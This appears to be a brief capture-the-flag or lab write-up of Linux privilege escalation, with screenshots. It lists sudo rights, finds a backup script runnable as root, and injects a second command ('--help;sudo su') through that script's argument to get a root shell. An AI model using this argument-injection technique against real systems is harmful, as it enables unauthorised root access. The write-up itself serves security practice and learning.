
sudo -l

<img width="796" alt="image" src="https://user-images.githubusercontent.com/59768512/167270262-887ad0d2-eedc-48c9-a667-8a5d37d74742.png">

can run sudo /usr/bin/python3 /home/user/safe_backup.py with args

see safe_backup.py

<img width="870" alt="image" src="https://user-images.githubusercontent.com/59768512/167270179-3574d9be-a110-491c-8208-d4e76893d452.png">

command injection


--help to statisfy tar 
sudo /usr/bin/python3 /home/user/safe_backup.py -e "--help;sudo su"

<img width="578" alt="image" src="https://user-images.githubusercontent.com/59768512/167680228-faee620b-631b-4767-bb49-582f91864c6a.png">

<img width="312" alt="image" src="https://user-images.githubusercontent.com/59768512/167680481-26fcd5f2-b437-4c09-8d92-02b9a56c9a68.png">
